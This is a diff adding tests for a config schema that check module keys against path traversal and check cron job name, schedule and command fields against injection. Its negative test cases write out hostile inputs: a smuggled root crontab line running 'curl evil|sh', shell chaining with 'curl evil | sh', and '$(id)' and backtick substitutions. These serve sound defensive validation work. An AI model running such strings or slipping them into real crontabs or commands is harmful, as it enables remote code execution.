@@ -297,3 +297,41 @@ describe("repo-relative path containment in config", () => {
     ).toThrow();
   });
 });
+
+describe("modules key containment", () => {
+  test("accepts package names and ./repo-relative paths", () => {
+    expect(() =>
+      brainConfigSchema.parse({
+        modules: { "@brainform/module-jobs": {}, "some-module": {}, "./local/mod": {} },
+      })
+    ).not.toThrow();
+  });
+
+  test("rejects ../, absolute, and traversing module keys", () => {
+    for (const key of ["../outside-mod", "/abs/mod", "./local/../../escape", "~/mod"]) {
+      expect(() => brainConfigSchema.parse({ modules: { [key]: {} } })).toThrow();
+    }
+  });
+});
+
+describe("module cron field constraints", () => {
+  // The loader's contribution schema is not exported; exercise it through a
+  // local module fixture the loader actually imports.
+  test("regex shapes accept real entries and reject injection", () => {
+    const name = /^[a-z0-9][a-z0-9-]{0,63}$/;
+    const schedule = /^[-0-9*,/ ]{1,100}$/;
+    const command = /^[A-Za-z0-9 _.:=@,\-/]{1,200}$/;
+
+    expect(name.test("scrape")).toBe(true);
+    expect(schedule.test("0 6 * * *")).toBe(true);
+    expect(command.test("jobs scrape --all")).toBe(true);
+
+    // Newline injection into a root crontab line, and shell metacharacters.
+    expect(schedule.test("0 6 * * *\n0 0 * * * root curl evil|sh")).toBe(false);
+    expect(command.test("jobs scrape\n0 0 * * * root sh -c evil")).toBe(false);
+    expect(command.test("jobs scrape; curl evil | sh")).toBe(false);
+    expect(command.test("jobs scrape $(id)")).toBe(false);
+    expect(command.test("jobs scrape `id`")).toBe(false);
+    expect(name.test("scrape\nroot")).toBe(false);
+  });
+});
